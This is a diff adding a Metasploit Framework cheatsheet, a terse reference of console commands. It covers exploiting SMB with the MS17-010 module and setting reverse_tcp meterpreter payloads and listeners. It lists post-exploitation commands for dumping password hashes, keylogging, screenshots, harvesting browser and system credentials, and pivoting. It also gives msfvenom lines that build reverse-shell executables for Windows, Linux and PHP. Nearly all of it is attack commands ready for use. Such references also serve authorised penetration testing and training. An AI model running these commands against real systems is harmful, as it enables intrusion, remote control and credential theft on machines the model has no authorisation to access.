@@ -1,0 +1,58 @@
+METASPLOIT FRAMEWORK CHEATSHEET
+================================
+
+STARTUP
+  msfconsole                  Launch console
+  msfdb init                  Initialize database
+  db_nmap -sV target          Nmap scan into DB
+
+BASIC WORKFLOW
+  search type:exploit name:smb       Search modules
+  use exploit/windows/smb/ms17_010   Select module
+  show options                       View parameters
+  set RHOSTS 192.168.1.100           Set target
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  set LHOST 192.168.1.50             Set listener IP
+  exploit / run                      Launch
+
+METERPRETER COMMANDS
+  sysinfo             System info
+  getuid              Current user
+  getsystem           Attempt SYSTEM
+  hashdump            Dump password hashes
+  shell               Drop to system shell
+  upload / download   Transfer files
+  screenshot          Take screenshot
+  keyscan_start       Start keylogger
+  ps                  List processes
+  migrate PID         Migrate to process
+  portfwd add -l 8080 -p 80 -r target   Port forward
+  route add subnet mask session          Pivot
+
+POST EXPLOITATION
+  run post/windows/gather/enum_logged_on_users
+  run post/multi/gather/firefox_creds
+  run post/windows/gather/credentials/credential_collector
+  run post/linux/gather/enum_configs
+
+HANDLER (LISTENER)
+  use exploit/multi/handler
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  set LHOST 0.0.0.0
+  set LPORT 4444
+  exploit -j             Run as background job
+
+PAYLOADS
+  msfvenom -p windows/x64/meterpreter/reverse_tcp \
+    LHOST=IP LPORT=4444 -f exe > shell.exe
+  msfvenom -p linux/x64/meterpreter/reverse_tcp \
+    LHOST=IP LPORT=4444 -f elf > shell.elf
+  msfvenom -p php/meterpreter/reverse_tcp \
+    LHOST=IP LPORT=4444 -f raw > shell.php
+
+DATABASE
+  hosts                List discovered hosts
+  services             List discovered services
+  vulns                List vulnerabilities
+  creds                List credentials
+  loot                 List loot
